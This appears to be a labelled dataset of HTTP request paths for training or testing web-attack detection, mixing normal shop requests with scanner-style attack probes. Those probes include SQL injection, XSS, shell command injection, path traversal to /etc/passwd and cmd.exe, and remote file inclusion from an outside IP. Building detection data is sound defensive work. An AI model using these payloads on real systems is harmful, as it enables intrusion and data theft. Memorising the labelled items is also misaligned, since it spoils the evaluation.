request	label
"/  ?  < script > document . cookie =  "" testxllt = 9940 ;  ""  <  / script > "	1
/ string / strings / parameters = 1 '  and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  and  ' rtbm '  =  ' rtbm 	1
/ string / strings / parameters = 18056 	0
/ 117352admin / 	0
/ components / com_mp3_allopass / allopass . php ? mosconfig_live_site = xxpathxx 	1
/ string / modo = entrar & login = de_souza & pwd = 3nmo08v16a & remember = off & b1 = entrar 	0
/ 112970 / 	0
/ en-us / jnv890lt . asp ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / modo = insertar & precio = 9637 & b1 = pasar + por + caja 	0
"/ string / strings / parameters = 1 ""  ""  )  )  and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  and  (  (  ""  "" nepk ""  ""  =  ""  "" nepk "	1
/ string / strings / parameters = yepes @ enla . mg 	0
/ 169772 / 	0
/ string / strings / parameters = jamaal 	0
/ string / strings / parameters = rorke 	0
/ string / strings / parameters = jernima 	0
/ examples / jsp / num / snpfiltered . pl ? t = c & u =  < script > foo <  / script > 	1
/ string / modo = registro & login = standfor & password = 80scip7l1da & nombre = amelia & apellidos = gavald & email = grinnage @ programagestionerp . kn & dni = 30388165j & direccion = c /  + joaquin + guichot ,  + 10 +  & ciudad = viver & cp = 13300 & provincia = barcelona & ntc = 7254612789884855 & b1 = registrar 	0
/ javascript / zips . gif 	0
/ iconcool-studio / 	0
/ suburbanplight / 	0
/ javascript / zorum . 7z 	0
/ string / strings / parameters = trish 	0
/ string / strings / parameters = 7665578374246731 	0
/ string / strings / parameters = alegra 	0
/ string / strings / parameters = brincones 	0
/ racing_new / 	0
"/ qczkquis . idc ?  < meta http-equiv = set-cookie content =  "" testkwlg = 5591 ""  > "	1
/ andromeda . php ? q = s & sm = fi & s =  < iframe src = javascript : alert (  ' wvs-xss-magic-string-411605577506 '  )  >  <  / iframe >  & x = 9 & y = 7 	1
/ modules / links / blocks / links . php ? system [ path ]  = xxpathxx 	1
/ javascript / usr . ep 	0
/ 20011108-4 / 	0
/ string / strings / parameters = hadrian 	0
/ 5o9zq43e . html ?  < script > cross_site_scripting . nasl <  / script > 	1
/ fitch-paradox / 	0
/ string / strings / parameters = http :  /  / xxxxxxxxxxx .  : 80 /  < script > alert (  ' vulnerable '  )  <  / script >  . shtml 	1
/ 000120762 / 	0
/ string / strings / parameters = altavista @ hojainformativa . com . tz 	0
/ f2183131 / 	0
"/  ?  < script > document . cookie =  "" testsixi = 8451 ;  ""  <  / script > "	1
/ string / strings / parameters = marc @ probandoo . kg 	0
/ string / strings / parameters = 47651101t 	0
/ javascript / trailer . temp 	0
/ includes / functions / html_generate . php ? path_prefix = xxpathxx 	1
"/ h5i6crm3 . fts ?  < meta http-equiv = set-cookie content =  "" testlihk = 7070 ""  > "	1
"/ string / strings / parameters = 1 ""  ""  where 1203 = 1203 union all select null , null , null -- "	1
/ javascript / key . msg 	0
"/ string / strings / parameters = -2072 ""  ""  )  as rjcz where 2491 = 2491 or 6872 = 6872 -- "	1
/ javascript / dummy . db 	0
/ executive_tech / 	0
/ includes / phpdig / includes / config . php ? relative_script_path = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ? 	1
/ string / strings / parameters = calle alonso nuez 186 ,  12 ? b 	0
/ jmdetail / 	0
/ string / strings / parameters = ; echo psmusp $  (  ( 33 + 35 )  )  $  ( echo psmusp ) psmusp ' 	1
"/ string / strings / parameters = ""   str =  $  ( echo sfurkw )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & "	1
/ string / modo = registro & login = haylock & password = zangarulln & nombre = eleuterio & apellidos = acevedo + cantonati & email = kuzuoglu5 @ nomao . iq & dni = 43751597p & direccion = c /  + maria + moliner + 48 +  & ciudad = ojos + negros & cp = 10160 & provincia = salamanca & ntc = 0358024000873525bob @  < script > alert ( paros )  <  / script >  . parosproxy . org & b1 = registrar 	1
/ javascript / to . doc 	0
/ 50103266 / 	0
/ string / modo = insertar & precio = 8223 & b1 = confirmar / 	1
/ string / modo = registro & login = shirleen & password = innmera & nombre = giuliana & apellidos = rosselot + azcona & email = rigas . albalak @ albeiteria . it & dni = 61218401z & direccion = carrer + doctor + esteve ,  + 124 ,  +  & ciudad = agres & cp = 20560 & provincia = salamanca & ntc = 2451542120615034 & b1 = registrar 	0
/ keyword_lawsuit / 	0
"/ h5i6crm3 . cfc ?  < meta http-equiv = set-cookie content =  "" testlihk = 7070 ""  > "	1
/ 104272 / 	0
/ string / strings / parameters = campoo de yuso 	0
/ javascript / address . xsl 	0
/ top . php ? stuff = ping ; -w ; 11000 ; -n ; 1 ; 4 . 3 . 2 . 1 & rem ; 	1
/ info-78297 / 	0
/ string / strings / parameters = calle ramon mario mirazo 46 	0
/ string / strings / parameters = alobras 	0
/ string / strings / parameters = 3ule1s 	0
"/ um7xpn15 . do ?  < meta http-equiv = set-cookie content =  "" testotoy = 6142 ""  > "	1
/ javascript / mambo . php 	0
/ string / modo = registro & login = evans & password = 8m48a & nombre = liana & apellidos = sastre + molt & emaila = tefane @ 978 . mp & dni = 97041884p & direccion = c /  + valldonzella ,  + 40 ,  + 2-g & ciudad = mosqueruela & cp = 19490 & provincia = zamora & ntc = 7521556295534229 & b1 = registrar 	1
/ html_node / 	0
/ string / modo = insertar & precio = 8432 & b1 = pasar + por + caja 	0
/ 156487 / 	0
/ javascript / tree . cpp 	0
/ help . php ? q =  \ x0auname \ x09 > q86474454 \ x09 # 	1
/ 26729896 / 	0
/ trojlineagejh / 	0
/ cgi-bin / index . php ? module = topics & func = view & topicid = -1 union select null , null ,  ' mdpro_topicid_sql_injection . nasl-1331918993 '  , null , null , null , null  -- 	1
/ javascript / true . war 	0
/ string / strings / parameters = 1 '  and  ( 3435 = 7210 )  * 7210 and  ' lxxt '  =  ' lxxt 	1
/ javascript / event . error 	0
/ string / strings / parameters = ;  str =  $  ( echo zvpmjq )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
/ string / strings / parameters = < script  /  * 	1
/ 487044 / 	0
/ string / strings / parameters = 1 '  )  )  or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 )  and  (  (  ' rpof '  like  ' rpof 	1
/ farvandsudsigter / 	0
/ 8394979 / 	0
/ string / strings / parameters = 1 and 3824 = benchmark ( 5000000 , md5 ( 0x76555642 )  )  --  kvkk 	1
/ string / strings / parameters = 46510 	0
/ video_spy / 	0
/ gunnyermeyswebring3 / 	0
/ string / modo = registro & login = tapani9 & password = ep9scopologio & nombre = seliem & apellidos = crous + zuta & email = kappeler-flick @ probandoo . mobi & dni = 82444604t & direccion = calle + capitan + palacios + 71 +  & ciudad = laguna + del + marquesado & cp = 12449 & provincia = la + rioja & ntc = 1595247568175334 & b1 = registrar 	0
"/ string / strings / parameters = < script > document . cookie =  "" testdnbh = 5237 ;  ""  <  / script > "	1
/ phpavt / 	0
"/ if69ddo1 . pl ?  < meta http-equiv = set-cookie content =  "" testiabz = 5220 ""  > "	1
/ alexander_shepherd / 	0
/ 20050310-15 / 	0
/ b0006n2ehi / 	0
/ sl-5700 / 	0
/ javascript / xxx . bat 	0
/ bobbitt-phil / 	0
/ esmozg5d . kspx ?  < script > cross_site_scripting . nasl <  / script > 	1
/ servpack / 	0
/ string / strings / parameters = 20491 	0
/ newsp / lib / class . database . php ? path = xxpathxx ? 	1
/ javascript / deny . xslt 	0
/  < script > cross_site_scripting . nasl <  / script >  . exe 	1
/ examples / jsp / colors / download . php ? language =  / etc / passwd \ x00 	1
/ 138134 / 	0
/ web-editions / 	0
/ phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1332010390 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00 	1
/ javascript / o . tar . bz2 	0
/ 021302a / 	0
/ string / strings / parameters = 0x77616974666f722064656c61792027303a303a313027  .  .  . 	1
/ 106404 / 	0
/ string / modo = registro & login = greytock & password = mbolo & nombre = stylianos & apellidos = lladonosa + uchuya & email = piazza @ filtraciondehumos . cc & dni = 77941713a & direccion = eduard + toda + 141 + 9 ? d & ciudad = siet + eiglesias + d . e + tormes & cp = 50686 & provincia = len & ntc = 8191484649460369 & b1 = registrar 	1
/ string / modo = insertar & precio = 1006 & b1 = confirmar 	0
/ string / modo = insertar & precio = 9168 & b1 = confirmar / 	1
/ iw269_we17-12 / 	0
/ winpim / 	0
"/ string / strings / parameters = < input type =  "" text ""  value =  `  `  < div / onmouseover =  ' alert ( 1 )  '  > x <  / div > "	1
/ zwierciadelko / 	0
/ string / modo = registro & login = chaya & password = c0o4c53ti81 & nombre = zbigniew & apellidos = u + rbina + cebrino & email = ramirez @ a2hotels . io & dni = 23423909l & direccion = nucleo + residencial + san + carlos ,  + 5 ,  + 3 ? h & ciudad = herrera & cp = 33785 & provincia = soria & ntc = 2124793186518142 & b1 = registrar 	1
/ javascript / port . cnf 	0
/ string / strings / parameters = nogus 	0
/ string / strings / parameters = h61ng19a 	0
/ iisadmpwd /  .  .  \ xc0 \ xaf .  .  \ xc0 \ xaf .  .  \ xc0 \ xaf .  .  \ xc0 \ xaf .  .  \ xc0 \ xaf .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og 	1
/ string / strings / parameters = 1 )  )  or 2367 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  -- 	1
/ registrar-choice / 	0
/ string / strings / parameters = '  |   [  3 -ne  $  ( echo jeorxy  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | 	1
/ cgi-914 / gw5 / gwweb . exe ? help = bad-request 	1
/ string / modo = entrar & login = cybotech & pwd = escobado & remember = off & b1 = entrar 	0
/ javascript / wtai . dll 	0
/ exchange-connector / 	0
/ sb116559428357044669 / 	0
/ javascript / it . temp 	0
/ examples / jsp / num / apexec . pl ? etype = odp & template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html & passurl =  / category / 	1
/ string / strings / parameters = escobedo santagata 	0
/ 16531987 / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  waitfor delay  ' 0 : 0 : 5 '  -- "	1
/ reassurance_gifts / 	0
/ gotnet / 	0
/ string / modo = entrar & login = orel & pwd = gu /  ' in_chado & remember = on & b1 = entrar 	1
/ string / strings / parameters = 35 	0
/ string / strings / parameters = < script itworksinallbrowsers >  /  *  < script *   *  / confirm ( 1 )  <  / script  ? 	1
/ string / strings / parameters = monique 	0
"/ string / strings / parameters = ' echo wmkuly $  (  ( 97 + 40 )  )  $  ( echo wmkuly ) wmkuly "" "	1
/ javascript / faq . exe 	1
/ run_over / 	0
/ talking stocks v2 / 	0
/ catering-business / 	0
/ zan292 / 	0
/ string / strings / parameters = 1 )  )  ; select sleep ( 5 )  # 	1
/ 187340 / 	0
/ adopter / 	0
/ string / modo = registro & login = kelessog & password = 131o1ho & nombre = servio & apellidos = isoba & email = delubac @ onoratoinformatica . ax & dni = 59608339k & direccion = calle + finlandia ,  + s / n +  & ciudad =  +  & cp = 22255 & provincia = granada & ntc = 0133515893356936 & b1 = registrar 	1
"/ ydexw8by . x ?  < script > document . cookie =  "" testulex = 4996 ;  ""  <  / script > "	1
/ string / strings / parameters = 1 '  and  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 3484 = 3484 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  and  ' tmwy '  =  ' tmwy 	1
/ cgi-bin / msmmask . exe ? mask =  / nessus1246303797 . asp 	1
/ header . php ? wwwroot = xxpathxx 	1
